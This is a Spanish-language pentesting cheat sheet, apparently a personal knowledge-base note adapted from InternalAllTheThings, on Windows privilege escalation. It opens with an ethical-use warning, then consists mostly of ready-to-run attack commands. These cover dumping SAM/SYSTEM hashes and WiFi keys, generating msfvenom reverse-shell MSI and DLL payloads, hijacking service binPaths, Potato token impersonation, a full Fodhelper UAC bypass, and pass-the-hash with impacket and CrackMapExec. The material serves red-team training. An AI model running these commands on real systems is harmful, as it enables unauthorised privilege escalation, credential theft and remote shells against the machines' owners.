---
tags:
  - post-explotacion
  - privesc
  - windows
  - pentesting
fuente: "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/"
licencia: MIT
---

# Escalada de Privilegios — Windows

> [!warning] Uso ético y autorizado. Ver [[📜 Fuentes y Licencias]].

---

## Herramientas automáticas

```powershell
# WinPEAS (más completo)
.\winPEAS.exe

# PowerUp (PowerShell)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt (C#)
.\Seatbelt.exe -group=all

# SharpUp
.\SharpUp.exe
```

---

## Enumeración inicial

```powershell
# Versión y parches
systeminfo
wmic qfe list brief

# Usuarios y grupos
whoami /all
net user
net localgroup administrators

# Red
ipconfig /all
netstat -ano
route print

# Procesos
tasklist /svc
Get-Process

# Servicios
sc query
Get-Service

# Antivirus
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName
```

---

## Búsqueda de credenciales

```powershell
# Archivos con contraseñas
findstr /si password *.txt *.xml *.config *.ini
dir /s *pass* *cred* *vnc* *.config

# SAM y SYSTEM (hashes locales — requiere SYSTEM)
reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system
# Extraer con impacket: secretsdump.py -sam sam -system system LOCAL

# HiveNightmare / CVE-2021-36934 (Windows 10 < 19041.1151)
icacls C:\Windows\System32\config\SAM

# Contraseñas WiFi
netsh wlan show profile
netsh wlan show profile <SSID> key=clear

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Credenciales en registro
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKCU /f password /t REG_SZ /s

# Unattend.xml (instalaciones desatendidas)
type C:\Windows\Panther\Unattend.xml
type C:\Windows\system32\sysprep\sysprep.xml
```

---

## Servicios mal configurados

```powershell
# Unquoted Service Path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Permisos débiles en ejecutable del servicio
icacls "C:\path\to\service.exe"

# Modificar binPath del servicio (requiere permisos sobre el servicio)
sc config <servicio> binPath= "C:\Windows\Temp\shell.exe"
sc start <servicio>

# AlwaysInstallElevated (MSI con privilegios de SYSTEM)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

---

## Token Impersonation (Potato attacks)

```powershell
# Ver privilegios actuales
whoami /priv

# SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege → Potato
# GodPotato (funciona en Windows Server 2012–2022)
.\GodPotato.exe -cmd "cmd /c whoami"

# PrintSpoofer (Windows 10 / Server 2016-2019)
.\PrintSpoofer.exe -i -c cmd

# JuicyPotato (antiguo, Windows < 2019)
.\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
```

---

## DLL Hijacking

```powershell
# Procmon → filtrar por "NAME NOT FOUND" en DLLs
# Identificar DLL buscada en directorio escribible

# Generar DLL maliciosa
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o malicious.dll
# Copiar con el nombre de la DLL esperada al directorio objetivo
```

---

## Bypass UAC

```powershell
# Fodhelper (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start cmd.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# Herramienta: UACME (múltiples métodos)
# https://github.com/hfiref0x/UACME
```

---

## Pass-the-Hash (sin AD)

```bash
# impacket (Linux → Windows)
impacket-psexec administrator@<IP> -hashes :<NTLM_HASH>
impacket-wmiexec administrator@<IP> -hashes :<NTLM_HASH>

# CrackMapExec
crackmapexec smb <IP> -u administrator -H <NTLM_HASH> -x "whoami"
```

---

## Kernel Exploits

```powershell
# Ver parches instalados
wmic qfe list brief | findstr "KB"

# Buscar exploit
searchsploit windows <versión>
```

| CVE | Descripción |
|-----|-------------|
| CVE-2021-1675 | PrintNightmare — Print Spooler RCE/LPE |
| CVE-2020-0796 | SMBGhost — SMBv3 LPE |
| CVE-2019-1388 | UAC Bypass via cert dialog |
| CVE-2016-0099 | Secondary Logon LPE |

---

## Flujo de trabajo

```
1. winPEAS / Seatbelt      → panorama completo
2. whoami /priv             → tokens (Potato attacks)
3. Servicios mal configurados (Unquoted path, permisos)
4. AlwaysInstallElevated
5. Credenciales (registro, archivos, WiFi, historial PS)
6. DLL Hijacking
7. systeminfo → kernel exploits
```

---

## Referencias
- [[🗺️ MOC Ciberseguridad y Redes]]
- [[Escalada de Privilegios Linux]]
- [[Persistencia Post-Explotación]]
- [[Active Directory — Ataques]]
- Fuente: [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/) — MIT
